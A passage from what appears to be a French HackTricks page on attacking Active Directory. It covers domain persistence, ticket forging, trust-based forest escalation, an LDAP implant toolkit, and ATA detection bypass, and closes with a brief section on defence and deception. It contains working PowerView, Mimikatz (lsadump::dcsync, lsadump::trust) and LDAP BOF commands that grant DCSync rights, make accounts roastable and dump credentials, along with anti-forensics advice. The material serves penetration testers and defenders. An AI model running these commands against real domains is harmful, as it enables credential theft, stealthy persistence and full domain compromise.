**Récupérer des certificats** depuis la machine compromise peut être une manière d'escalader des privilèges dans l'environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si des **templates vulnérables** sont configurés il est possible de les abuser pour escalader des privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Une fois que vous obtenez les privilèges **Domain Admin** ou mieux **Enterprise Admin**, vous pouvez **dumper** la **base de données du domaine** : _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Certaines des techniques discutées précédemment peuvent être utilisées pour la persistence.\
Par exemple vous pourriez :

- Rendre des utilisateurs vulnérables à [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendre des utilisateurs vulnérables à [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Accorder des privilèges [**DCSync**](#dcsync) à un utilisateur

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'attaque **Silver Ticket** crée un **TGS légitime** pour un service spécifique en utilisant le **NTLM hash** (par exemple, le **hash du compte PC**). Cette méthode est employée pour **accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **Golden Ticket attack** implique qu'un attaquant obtienne le **NTLM hash du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est spécial car il sert à signer tous les **Ticket Granting Tickets (TGTs)**, essentiels pour l'authentification dans le réseau AD.

Une fois que l'attaquant obtient ce hash, il peut créer des **TGTs** pour n'importe quel compte qu'il choisit (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ce sont comme des golden tickets forgés d'une manière qui **bypass** les mécanismes de détection courants des golden tickets.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posséder des certificats d'un compte ou pouvoir les demander** est un très bon moyen de persister dans le compte d'un utilisateur (même s'il change son mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Utiliser des certificats permet aussi de persister avec des privilèges élevés à l'intérieur du domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'objet **AdminSDHolder** dans Active Directory assure la sécurité des **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant un **ACL** standard à travers ces groupes pour empêcher les modifications non autorisées. Cependant, cette fonctionnalité peut être exploitée ; si un attaquant modifie l'ACL d'AdminSDHolder pour donner un accès complet à un utilisateur ordinaire, cet utilisateur obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, destinée à protéger, peut donc se retourner contre l'organisation à moins d'être surveillée de près.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dans chaque **Domain Controller (DC)** existe un compte **Administrator local**. En obtenant des droits admin sur une telle machine, le hash de l'Administrator local peut être extrait avec **mimikatz**. Ensuite une modification du registre est nécessaire pour **autoriser l'utilisation de ce mot de passe**, permettant l'accès à distance au compte Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Vous pourriez **donner** certaines **permissions spéciales** à un **utilisateur** sur des objets spécifiques du domaine qui permettront à l'utilisateur **d'escalader des privilèges à l'avenir**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Les **security descriptors** sont utilisés pour **stocker** les **permissions** qu'un **objet** a **sur** un **objet**. Si vous pouvez simplement **faire** un **petit changement** dans le **security descriptor** d'un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d'être membre d'un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifier **LSASS** en mémoire pour établir un **mot de passe universel**, donnant l'accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer** en **clear text** les **credentials** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Il enregistre un **nouveau Domain Controller** dans l'AD et l'utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous **avez besoin de DA** privileges et d'être à l'intérieur du **root domain**.\
Notez que si vous utilisez de mauvaises données, des logs assez laids apparaîtront.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Plus haut nous avons expliqué comment escalader des privilèges si vous avez **suffisamment de permissions pour lire les mots de passe LAPS**. Cependant, ces mots de passe peuvent aussi être utilisés pour **maintenir la persistence**.\
Voir :


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considère la **Forêt** comme la frontière de sécurité. Cela implique que **compromettre un seul domaine pourrait potentiellement conduire à la compromission de toute la Forêt**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d'un **domaine** d'accéder aux ressources d'un autre **domaine**. Il crée essentiellement un lien entre les systèmes d'authentification des deux domaines, permettant aux validations d'authentification de circuler de manière fluide. Lorsque des domaines configurent une trust, ils échangent et conservent des **keys** spécifiques au sein de leurs **Domain Controllers (DCs)**, qui sont cruciales pour l'intégrité de la trust.

Dans un scénario typique, si un utilisateur souhaite accéder à un service dans un **domaine de confiance**, il doit d'abord demander un ticket spécial connu sous le nom d'**inter-realm TGT** auprès du DC de son propre domaine. Ce TGT est chiffré avec une **key** partagée que les deux domaines ont convenue. L'utilisateur présente ensuite ce TGT au **DC du domaine de confiance** pour obtenir un service ticket (**TGS**). Après la validation réussie de l'inter-realm TGT par le DC du domaine de confiance, ce dernier émet un TGS, accordant à l'utilisateur l'accès au service.

**Étapes** :

1. Un **ordinateur client** dans le **Domaine 1** commence le processus en utilisant son **NTLM hash** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 émet un nouveau TGT si le client est authentifié avec succès.
3. Le client demande ensuite un **inter-realm TGT** à DC1, nécessaire pour accéder aux ressources du **Domaine 2**.
4. L'inter-realm TGT est chiffré avec une **trust key** partagée entre DC1 et DC2 dans le cadre de la trust bidirectionnelle entre domaines.
5. Le client apporte l'inter-realm TGT au **Domain Controller (DC2)** du Domaine 2.
6. DC2 vérifie l'inter-realm TGT à l'aide de sa trust key partagée et, si valide, émet un **Ticket Granting Service (TGS)** pour le serveur du Domaine 2 auquel le client veut accéder.
7. Enfin, le client présente ce TGS au serveur, qui est chiffré avec le hash du compte du serveur, pour obtenir l'accès au service dans le Domaine 2.

### Different trusts

Il est important de noter qu'**une trust peut être à sens unique ou bidirectionnelle**. Dans l'option bidirectionnelle, les deux domaines se font mutuellement confiance, mais dans la relation de trust **à sens unique** l'un des domaines sera le **trusted** et l'autre le **trusting**. Dans ce dernier cas, **vous ne pourrez accéder aux ressources que depuis le domaine trusting à partir du domaine trusted**.

Si le Domaine A trust le Domaine B, A est le trusting domain et B est le trusted. De plus, dans le **Domaine A**, ce sera une **Outbound trust** ; et dans le **Domaine B**, ce sera une **Inbound trust**.

**Différents types de trusting relationships**

- **Parent-Child Trusts** : C'est une configuration courante au sein d'une même forêt, où un domaine enfant a automatiquement une trust transitive bidirectionnelle avec son domaine parent. Essentiellement, cela signifie que les requêtes d'authentification peuvent circuler facilement entre le parent et l'enfant.
- **Cross-link Trusts** : Appelées aussi "shortcut trusts", elles sont établies entre domaines enfants pour accélérer les processus de referral. Dans des forêts complexes, les referrals d'authentification doivent typiquement remonter jusqu'à la racine de la forêt puis redescendre jusqu'au domaine cible. En créant des cross-links, le parcours est raccourci, ce qui est particulièrement utile dans des environnements géographiquement dispersés.
- **External Trusts** : Celles-ci sont configurées entre domaines différents et non liés et sont non-transitives par nature. Selon la documentation de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les external trusts sont utiles pour accéder à des ressources dans un domaine en dehors de la forêt courante qui n'est pas connecté par une forest trust. La sécurité est renforcée via le SID filtering avec les external trusts.
- **Tree-root Trusts** : Ces trusts sont automatiquement établies entre le domaine racine de la forêt et une nouvelle tree root ajoutée. Bien qu'elles ne soient pas couramment rencontrées, les tree-root trusts sont importantes pour ajouter de nouveaux arbres de domaine à une forêt, leur permettant de conserver un nom de domaine unique et assurant une transitivité bidirectionnelle. Plus d'informations sont disponibles dans [le guide de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts** : Ce type de trust est une trust transitive bidirectionnelle entre deux forest root domains, appliquant également le SID filtering pour renforcer les mesures de sécurité.
- **MIT Trusts** : Ces trusts sont établies avec des domaines Kerberos non-Windows conformes à [RFC4120](https://tools.ietf.org/html/rfc4120). Les MIT trusts sont un peu plus spécialisées et conviennent aux environnements nécessitant une intégration avec des systèmes Kerberos en dehors de l'écosystème Windows.

#### Other differences in **trusting relationships**

- Une relation de trust peut aussi être **transitive** (A trust B, B trust C, alors A trust C) ou **non-transitive**.
- Une relation de trust peut être configurée comme une **bidirectional trust** (les deux se font confiance) ou comme une **one-way trust** (seul l'un fait confiance à l'autre).

### Attack Path

1. **Enumérer** les relations de trust
2. Vérifier si un **security principal** (user/group/computer) a **accès** aux ressources de **l'autre domaine**, peut-être via des entrées ACE ou en étant membre de groupes de l'autre domaine. Cherchez des **relations entre domaines** (la trust a été créée pour cela probablement).
1. kerberoast dans ce cas pourrait être une autre option.
3. **Compromettre** les **comptes** qui peuvent **pivot** entre domaines.

Les attaquants peuvent accéder aux ressources d'un autre domaine via trois mécanismes principaux :

- **Local Group Membership** : Des principals peuvent être ajoutés à des groupes locaux sur des machines, comme le groupe "Administrators" d'un serveur, leur accordant un contrôle significatif sur cette machine.
- **Foreign Domain Group Membership** : Des principals peuvent aussi être membres de groupes dans le domaine étranger. Cependant, l'efficacité de cette méthode dépend de la nature de la trust et de la portée du groupe.
- **Access Control Lists (ACLs)** : Des principals peuvent être spécifiés dans une **ACL**, en particulier comme entités dans des **ACEs** au sein d'une **DACL**, leur fournissant l'accès à des ressources spécifiques. Pour ceux qui souhaitent approfondir la mécanique des ACLs, DACLs et ACEs, le whitepaper intitulé “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” est une ressource inestimable.

### Find external users/groups with permissions

Vous pouvez vérifier **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les foreign security principals dans le domaine. Ceux-ci seront des user/group provenant **d'un domaine/forest externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou en utilisant powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Autres moyens d'énumérer les relations de confiance de domaine :
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Il existe **2 trusted keys**, une pour _Child --> Parent_ et une autre pour _Parent_ --> _Child_.\
> Vous pouvez connaître celle utilisée par le domaine courant avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin vers le domaine child/parent en abusant de la trust via SID-History injection :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendre comment exploiter la Configuration Naming Context (NC) est crucial. La Configuration NC sert de dépôt central pour les données de configuration à travers une forêt dans les environnements Active Directory (AD). Ces données sont répliquées vers chaque Domain Controller (DC) au sein de la forêt, et les DCs inscriptibles conservent une copie modifiable de la Configuration NC. Pour exploiter cela, il faut disposer de privilèges **SYSTEM sur un DC**, de préférence un DC enfant.

**Link GPO to root DC site**

Le conteneur Sites de la Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine au sein de la forêt AD. En opérant avec des privilèges SYSTEM sur n’importe quel DC, un attaquant peut linker des GPOs aux sites du DC racine. Cette action peut compromettre potentiellement le domaine racine en manipulant les politiques appliquées à ces sites.

Pour des informations détaillées, on peut consulter les recherches sur [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vecteur d’attaque consiste à cibler des gMSA privilégiés au sein du domaine. La KDS Root key, essentielle pour calculer les mots de passe des gMSA, est stockée dans la Configuration NC. Avec des privilèges SYSTEM sur n’importe quel DC, il est possible d’accéder à la KDS Root key et de calculer les mots de passe de n’importe quel gMSA dans la forêt.

Analyse détaillée et guide étape par étape disponibles dans :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque MSA déléguée complémentaire (BadSuccessor – abus des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherche externe complémentaire : [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Cette méthode demande de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec des privilèges SYSTEM, un attaquant peut modifier le Schema AD pour accorder à n’importe quel utilisateur le contrôle total sur toutes les classes. Cela peut mener à un accès et un contrôle non autorisés sur les objets AD nouvellement créés.

Pour aller plus loin, voir [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnérabilité ADCS ESC5 cible le contrôle des objets PKI pour créer un template de certificat permettant de s’authentifier en tant que n’importe quel utilisateur au sein de la forêt. Comme les objets PKI résident dans la Configuration NC, compromettre un DC enfant inscriptible permet d’exécuter des attaques ESC5.

Plus de détails dans [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). En l’absence d’ADCS, l’attaquant peut mettre en place les composants nécessaires, comme expliqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Domaine de forêt externe - Unidirectionnel (Entrant) ou bidirectionnel
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Dans ce scénario, **votre domaine est approuvé** par un domaine externe, ce qui vous donne des **permissions indéterminées** sur celui-ci. Vous devrez identifier **quels principals de votre domaine disposent de quels accès sur le domaine externe** puis tenter de les exploiter :

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine de forêt externe - sens unique (sortant)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Dans ce scénario **votre domaine** fait **confiance** à un principal d'un **autre domaine** en lui accordant certains **privilèges**.

Cependant, lorsqu'un **domaine est approuvé** par le domaine qui fait confiance, le domaine approuvé **crée un utilisateur** avec un **nom prévisible** qui utilise comme **mot de passe le mot de passe approuvé**. Ce qui signifie qu'il est possible pour un attaquant d'**utiliser un compte du domaine qui fait confiance pour accéder au domaine approuvé**, l'énumérer et tenter d'escalader davantage de privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine approuvé est de trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** de la confiance de domaine (ce qui n'est pas très courant).

Une autre méthode pour compromettre le domaine approuvé consiste à attendre sur une machine où un **utilisateur du domaine approuvé peut se connecter** via **RDP**. Ensuite, l'attaquant peut injecter du code dans le processus de la **RDP session** et **accéder au domaine d'origine de la victime** depuis là.\
De plus, si la **victime a monté son disque dur**, depuis le processus de la **RDP session** l'attaquant pourrait déposer des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s'appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Atténuation des abus de trust de domaine

### **SID Filtering:**

- Le risque d'attaques exploitant l'attribut SIDHistory à travers des forest trusts est atténué par SID Filtering, qui est activé par défaut sur toutes les inter-forest trusts. Cela repose sur l'hypothèse que les trusts intra-forest sont sûrs, considérant la forêt, plutôt que le domaine, comme la frontière de sécurité selon la position de Microsoft.
- Cependant, il y a un inconvénient : SID Filtering peut perturber des applications et l'accès des utilisateurs, ce qui conduit parfois à sa désactivation.

### **Selective Authentication:**

- Pour les inter-forest trusts, l'utilisation de Selective Authentication garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. Des permissions explicites sont nécessaires pour que les utilisateurs accèdent aux domaines et serveurs au sein du domaine ou de la forêt qui fait confiance.
- Il est important de noter que ces mesures ne protègent pas contre l'exploitation du writable Configuration Naming Context (NC) ni contre les attaques visant le trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abus AD basé sur LDAP depuis des implants sur l'hôte

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ré-implémente des primitives LDAP de style bloodyAD en tant que x64 Beacon Object Files qui s'exécutent entièrement à l'intérieur d'un implant sur l'hôte (par ex., Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis appellent `ldap <subcommand>` depuis le beacon. Tout le trafic emprunte le contexte de sécurité du logon courant sur LDAP (389) avec signing/sealing ou LDAPS (636) avec auto certificate trust, donc aucun proxy socks ni artefact disque n'est requis.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` résolvent des noms courts/chemins d'OU en DNs complets et vident les objets correspondants.
- `get-object`, `get-attribute`, and `get-domaininfo` récupèrent des attributs arbitraires (y compris les security descriptors) ainsi que les métadonnées forest/domain depuis `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` exposent des roasting candidates, les delegation settings et les descripteurs existants de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directement depuis LDAP.
- `get-acl` and `get-writable --detailed` analysent la DACL pour lister les trustees, les droits (GenericAll/WriteDACL/WriteOwner/attribute writes) et l'héritage, fournissant des cibles immédiates pour l'escalade de privilèges via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitives d'écriture LDAP pour l'escalade et la persistance

- Les BOFs de création d'objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l'opérateur de déployer de nouveaux principals ou comptes machine partout où des droits OU existent. `add-groupmember`, `set-password`, `add-attribute`, et `set-attribute` détournent directement des cibles une fois les droits write-property trouvés.
- Les commandes axées sur les ACL telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, et `add-dcsync` traduisent WriteDACL/WriteOwner sur n'importe quel objet AD en réinitialisations de mot de passe, contrôle de l'appartenance aux groupes, ou privilèges de réplication DCSync sans laisser d'artefacts PowerShell/ADSI. Les homologues `remove-*` nettoient les ACE injectés.

### Délégation, roasting, et abus de Kerberos

- `add-spn`/`set-spn` rendent instantanément un utilisateur compromis Kerberoastable ; `add-asreproastable` (basculer UAC) le marque pour AS-REP roasting sans toucher le mot de passe.
- Les macros de délégation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les flags UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, permettant des chemins d'attaque constrained/unconstrained/RBCD et éliminant le besoin de PowerShell distant ou RSAT.

### sidHistory injection, OU relocation, et façonnage de la surface d'attaque

- `add-sidhistory` injecte des SIDs privilégiés dans l'historique SID d'un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), permettant une transmission furtive des droits d'accès entièrement via LDAP/LDAPS.
- `move-object` change le DN/OU des ordinateurs ou utilisateurs, permettant à un attaquant de déplacer des assets dans des OUs où des droits délégués existent déjà avant d'abuser de `set-password`, `add-groupmember`, ou `add-spn`.
- Les commandes de suppression ciblées (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un rollback rapide après que l'opérateur a récolté des identifiants ou obtenu de la persistance, minimisant la télémétrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques défenses générales

[**En savoir plus sur la protection des identifiants ici.**](../stealing-credentials/credentials-protections.md)

### **Mesures défensives pour la protection des identifiants**

- **Domain Admins Restrictions** : Il est recommandé que les Domain Admins ne soient autorisés à se connecter qu'aux Domain Controllers, évitant leur utilisation sur d'autres hôtes.
- **Service Account Privileges** : Les services ne devraient pas être exécutés avec les privilèges Domain Admin (DA) pour maintenir la sécurité.
- **Temporal Privilege Limitation** : Pour les tâches nécessitant des privilèges DA, leur durée devrait être limitée. Cela peut être réalisé par : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation** : Auditer les Event IDs 2889/3074/3075 puis appliquer LDAP signing ainsi que LDAPS channel binding sur les DCs/clients pour bloquer les tentatives de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Mise en œuvre de techniques de déception**

- Mettre en œuvre la déception implique de poser des pièges, comme des utilisateurs ou ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n'expirent pas ou marqués comme Trusted for Delegation. Une approche détaillée inclut la création d'utilisateurs avec des droits spécifiques ou leur ajout à des groupes à haut privilège.
- Un exemple pratique implique l'utilisation d'outils tels que : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Plus d'informations sur le déploiement de techniques de déception sont disponibles sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifier la déception**

- **Pour les objets User** : Les indicateurs suspects incluent un ObjectSID atypique, des logons peu fréquents, les dates de création, et un faible nombre d'échecs de mot de passe.
- **Indicateurs généraux** : Comparer les attributs d'objets leurres potentiels avec ceux des objets authentiques peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier ces déceptions.

### **Contourner les systèmes de détection**

- **Microsoft ATA Detection Bypass** :
- **User Enumeration** : Éviter l'énumération de session sur les Domain Controllers pour prévenir la détection ATA.
- **Ticket Impersonation** : Utiliser des clés **aes** pour la création de tickets aide à échapper à la détection en n'abaissant pas vers NTLM.
- **DCSync Attacks** : Il est conseillé d'exécuter depuis un hôte non-Domain Controller pour éviter la détection ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## Références

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
